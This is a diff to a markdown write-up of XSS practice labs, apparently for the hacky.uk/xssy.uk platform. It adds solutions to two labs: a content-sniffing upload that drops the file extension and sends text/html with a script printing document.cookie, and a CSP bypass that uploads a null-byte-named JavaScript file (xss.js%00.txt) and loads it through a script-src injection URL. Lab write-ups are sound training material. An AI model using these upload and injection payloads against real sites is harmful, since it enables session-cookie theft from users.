@@ -737,9 +737,19 @@ https://qanxukb3.hacky.uk/upload/photo.html
 ---
 
 ### Lab 637: Sniffing Danger
-- **URL Lab**: https://xssy.uk/lab/637
-- **Status**: Not solved yet
-- **Description**: Tried change filename, modified filetype, content-type but nothing worked
+- **URL Lab**: https://hacky.uk/lab/637
+- **Payload**: 
+```javascript
+filename="photo"
+Content-Type: text/html
+
+<script>alert(document.cookie)</script>
+```
+- **Full URL**: 
+```
+https://i66xvlw2.hacky.uk/upload/photo
+```
+- **Description**: the browser filter every whitelist extension format. So I delete the .jpg/.html/.pdf extension, and then change the content type to text/html, and then inject the body with xss payload
 
 ---
 
@@ -866,9 +876,21 @@ https://thnxclxd.xssy.uk/target.ftl?name=%3Cscript%20src=%22jsonp.ftl?callback=a
 ---
 
 ### Lab 628: Upload CSP Bypass
-- **URL Lab**: https://xssy.uk/lab/628
-- **Status**: Not solved yet
+- **URL Lab**: https://hacky.uk/lab/628
+- **Payload**: 
+```html
+POST /upload.ftl HTTP/2
+filename="xss.js%00.txt"
+Content-Type: text/plain
 
+alert(document.cookie);
+
+```
+- **Full URL**: 
+```
+https://wtjjctrj.hacky.uk/target.ftl?name=%3Cscript+src%3D%2Fupload%2Fxss.js%2500.txt%3Ealert%28document.cookie%29%3C%2Fscript%3E
+```
+- **Description**: Send the file upload first and then submit the <script src=/uplozc/xss.js%00.txt>alert(document.cookie)</script>
 ---
 
 ### Lab 179: Enctype Spoofing
